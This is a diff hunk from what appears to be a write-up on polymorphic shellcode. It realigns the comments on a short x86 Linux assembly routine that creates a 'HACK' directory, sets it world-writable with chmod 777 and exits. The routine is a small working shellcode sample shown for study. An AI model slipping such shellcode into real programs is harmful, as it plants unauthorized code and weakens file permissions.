@@ -94,17 +94,17 @@ int 0x80
 Polymorphic assembly source:
 
 ```nasm
-xor eax, eax                             ; Clearing out EAX register
-push eax                                 ; PUSH for NULL termination
-push dword 0x4b434148                    ; PUSH dir name HACK
-mov al, 0x27                             ; Load 0x27 syscall val for mkdir in AL 
-mov ebx, esp                             ; Store address of TOS in EBX
-int 0x80                                 ; Executing mkdir syscall
-mov al, 0xf                              ; Load 0x0f syscall val for chmod in AL
-mov cx, 0x1ff                            ; Load permission to CX
-int 0x80                                 ; Executing chmod syscall
-inc eax                                  ; Incrementing val of EAX to 1 - exit
-int 0x80                                 ; Executing exit syscall
+xor eax, eax                 ; Clearing out EAX register
+push eax                     ; PUSH for NULL termination
+push dword 0x4b434148        ; PUSH dir name HACK
+mov al, 0x27                 ; Load 0x27 syscall val for mkdir in AL 
+mov ebx, esp                 ; Store address of TOS in EBX
+int 0x80                     ; Executing mkdir syscall
+mov al, 0xf                  ; Load 0x0f syscall val for chmod in AL
+mov cx, 0x1ff                ; Load permission to CX
+int 0x80                     ; Executing chmod syscall
+inc eax                      ; Incrementing val of EAX to 1 - exit
+int 0x80                     ; Executing exit syscall
 ```
 
 Length of original shellcode: `29 bytes`
